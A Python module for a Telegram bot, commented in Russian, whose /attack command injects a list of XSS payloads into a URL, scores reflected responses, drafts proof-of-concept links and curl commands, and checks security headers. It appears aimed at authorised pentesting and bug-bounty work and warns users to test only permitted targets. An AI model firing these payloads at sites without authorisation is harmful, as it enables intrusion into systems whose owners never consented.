# modules/attack.py
#
# /attack URL
# Пример:
#   /attack http://testphp.vulnweb.com/artists.php?artist=FUZZ
#
# Делает:
#   1) умный XSS-fuzz по набору payload'ов
#   2) находит самые подозрительные ответы
#   3) генерирует черновик PoC для топ-кандидата
#   4) даёт быструю оценку security-заголовков для домена

import re
from urllib.parse import urlparse

import aiohttp
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ContextTypes

# Небольшой, но "умный" набор XSS-payload'ов
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "';alert(1);//",
    "\"><script>confirm(1)</script>",
    "<img src=x onerror=confirm(1)>",
    "<script>prompt(1)</script>",
    "'';!--\"<XSS>=&{()}"
]

HEADERS = {
    "User-Agent": "KimuraCopilot-Attack/1.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}


async def _fetch(session: aiohttp.ClientSession, url: str):
    """Один HTTP-запрос с обработкой ошибок."""
    try:
        async with session.get(url, headers=HEADERS, timeout=10, allow_redirects=True) as resp:
            text = await resp.text(errors="ignore")
            return resp.status, dict(resp.headers), text
    except Exception as e:
        return None, {}, f"ERROR: {e}"


def _score_xss(payload: str, body: str) -> int:
    """
    Простейшая эвристика:
      +3  если есть 'alert(' или 'confirm(' или 'prompt('
      +2  если payload отражён почти целиком
      +1  если любые подозрительные on* / svg / script есть
    """
    score = 0
    low = body.lower()

    # payload целиком (или почти)
    if payload[:10].lower() in low:
        score += 2

    # ключевые слова
    if "alert(" in low or "confirm(" in low or "prompt(" in low:
        score += 3

    # onerror/onload и т.п.
    if "onerror=" in low or "onload=" in low or "<svg" in low or "<script" in low:
        score += 1

    return score


def _shorten(value: str, max_len: int = 60) -> str:
    value = value.replace("\n", " ")
    if len(value) <= max_len:
        return value
    return value[:max_len - 3] + "..."


def _build_autopoc(target_url: str) -> str:
    """Черновики PoC (HTML / JS / curl) для отчёта."""
    return (
        "Черновики PoC (используй только в рамках легального pentest / bug bounty):\n\n"
        "1️⃣ HTML-ссылка:\n"
        "```html\n"
        f'<a href="{target_url}">Click me</a>\n'
        "```\n\n"
        "2️⃣ JS-редирект:\n"
        "```html\n"
        f'<script>location.href="{target_url}";</script>\n'
        "```\n\n"
        "3️⃣ cURL-запрос:\n"
        "```bash\n"
        f"curl -k \"{target_url}\"\n"
        "```\n"
    )


def _analyze_headers(headers: dict) -> str:
    """Быстрая оценка security-заголовков."""
    h = {k.lower(): v for k, v in headers.items()}
    missing = []
    present = []

    def check(name: str, label: str):
        if name in h:
            present.append(label)
        else:
            missing.append(label)

    check("content-security-policy", "Content-Security-Policy")
    check("x-frame-options", "X-Frame-Options")
    check("x-content-type-options", "X-Content-Type-Options")
    check("strict-transport-security", "HSTS (Strict-Transport-Security)")

    cookies = h.get("set-cookie", "")

    lines = []
    if present:
        lines.append("✅ Есть security-заголовки:\n- " + "\n- ".join(present))
    if missing:
        lines.append("⚠ Отсутствуют важные security-заголовки:\n- " + "\n- ".join(missing))
    if cookies:
        # очень грубая проверка
        if "httponly" not in cookies.lower() or "secure" not in cookies.lower():
            lines.append("⚠ Cookie в Set-Cookie без HttpOnly/Secure — проверь конфигурацию.")
        else:
            lines.append("✅ В Set-Cookie есть HttpOnly/Secure.")
    return "\n\n".join(lines) if lines else "Не удалось проанализировать заголовки."


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /attack URL
    URL ОБЯЗАТЕЛЬНО должен содержать слово FUZZ.
    """
    if not context.args:
        await update.message.reply_text(
            "⚙ Использование:\n"
            "/attack http://testphp.vulnweb.com/artists.php?artist=FUZZ\n\n"
            "В URL обязательно должно быть слово FUZZ — на его место я буду подставлять payload'ы."
        )
        return

    raw_url = " ".join(context.args).strip()

    if "FUZZ" not in raw_url:
        await update.message.reply_text(
            "❗ В URL должно быть слово 'FUZZ'. Пример:\n"
            "/attack http://testphp.vulnweb.com/artists.php?artist=FUZZ"
        )
        return

    await update.message.reply_text(
        f"🧠 Kimura Attack для:\n{raw_url}\n\n"
        "Подставляю XSS-payload'ы и ищу самые подозрительные ответы...\n"
        "Используй только на целях, где у тебя есть разрешение!"
    )

    parsed = urlparse(raw_url.replace("FUZZ", "test"))
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    findings = []

    async with aiohttp.ClientSession() as session:
        # 1) XSS-fuzz
        for payload in XSS_PAYLOADS:
            url = raw_url.replace("FUZZ", payload)
            status, headers, body = await _fetch(session, url)

            if status is None:
                continue

            score = _score_xss(payload, body)
            if score <= 0:
                continue

            findings.append({
                "score": score,
                "url": url,
                "status": status,
                "payload": payload,
                "reason": "payload отражается без экранирования / есть alert/confirm/prompt",
                "length": len(body),
            })

        # 2) быстрый просмотр заголовков для домена
        base_status, base_headers, _ = await _fetch(session, base_url)

    if not findings:
        text = (
            f"🔥 Kimura Attack отчёт для: {raw_url}\n\n"
            "Я не нашёл явно интересных ответов по своим эвристикам.\n"
            "Но всё равно стоит проверить URL вручную в Burp, ffuf, kxss, nuclei и своими скриптами.\n\n"
        )
    else:
        findings.sort(key=lambda x: x["score"], reverse=True)
        top = findings[:5]

        lines = [
            f"🔥 Kimura Attack отчёт для: {raw_url}",
            f"Проверено payload'ов: {len(XSS_PAYLOADS)}",
            f"Найдено подозрительных ответов: {len(findings)}",
            "",
            "Ниже показаны самые интересные ответы (по убыванию важности):",
            ""
        ]

        for i, f in enumerate(top, start=1):
            lines.append(
                f"{i}. [score={f['score']}] [HTTP {f['status']}] {_shorten(f['url'], 140)}\n"
                f"   Длина ответа: {f['length']}\n"
                f"   Причины: {f['reason']}\n"
            )

        text = "\n".join(lines) + "\n"

        # Сгенерируем PoC для самого топового варианта
        best_url = top[0]["url"]
        text += "\n" + _build_autopoc(best_url)

    # Добавим анализ заголовков
    if base_status:
        text += (
            "\n\n🧩 Быстрый анализ security-заголовков для домена:\n"
            f"{base_url} (HTTP {base_status})\n\n"
        )
        text += _analyze_headers(base_headers)

    # Ограничимся одним сообщением (если очень длинное — Telegram сам обрежет)
    await update.message.reply_text(text, disable_web_page_preview=True)
